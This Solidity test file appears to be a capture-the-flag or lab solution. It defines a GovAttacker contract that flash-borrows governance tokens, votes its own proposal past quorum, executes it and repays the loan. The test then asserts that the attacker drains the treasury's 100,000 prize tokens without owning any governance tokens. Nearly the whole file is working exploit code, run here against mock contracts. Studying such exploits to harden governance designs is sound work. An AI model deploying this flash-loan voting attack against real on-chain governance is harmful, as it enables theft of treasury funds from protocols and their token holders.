// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "../../shared/MockERC20.sol";
import {FlashLender, IFlashBorrower} from "../src/FlashLender.sol";
import {Governance} from "../src/Governance.sol";

/// Borrows the governance token for one transaction, votes a self-serving
/// proposal past quorum, executes it, and repays — owning the prize for free.
contract GovAttacker is IFlashBorrower {
    FlashLender public lender;
    Governance public gov;
    MockERC20 public govToken;
    MockERC20 public prize;
    uint256 public proposalId;
    uint256 public amount;

    constructor(FlashLender _lender, Governance _gov, MockERC20 _govToken, MockERC20 _prize) {
        lender = _lender;
        gov = _gov;
        govToken = _govToken;
        prize = _prize;
    }

    function attack(uint256 prizeAmount, uint256 borrow) external {
        amount = borrow;
        proposalId = gov.propose(address(this), prizeAmount);
        lender.flashLoan(borrow);
    }

    function onFlashLoan(uint256 borrowed) external {
        gov.vote(proposalId);   // voting power = the borrowed balance
        gov.execute(proposalId); // prize sent to this contract
        govToken.transfer(address(lender), borrowed); // repay
    }

    function sweep(address to) external {
        prize.transfer(to, prize.balanceOf(address(this)));
    }
}

contract GovernanceSolution is Test {
    MockERC20 govToken;
    MockERC20 prize;
    FlashLender lender;
    Governance gov;
    address attacker = makeAddr("attacker");
    uint256 constant PRIZE = 100_000e18;

    function setUp() public {
        govToken = new MockERC20("Gov", "GOV");
        prize = new MockERC20("Prize", "PRZ");
        lender = new FlashLender(govToken);
        gov = new Governance(govToken, prize);
        govToken.mint(address(lender), gov.QUORUM());
        prize.mint(address(gov), PRIZE);
    }

    function test_exploit() public {
        GovAttacker a = new GovAttacker(lender, gov, govToken, prize);
        a.attack(PRIZE, gov.QUORUM());
        a.sweep(attacker);

        assertEq(prize.balanceOf(attacker), PRIZE, "attacker drains the treasury via a flash-loaned vote");
        assertEq(govToken.balanceOf(attacker), 0, "attacker spent no governance tokens of their own");
    }
}
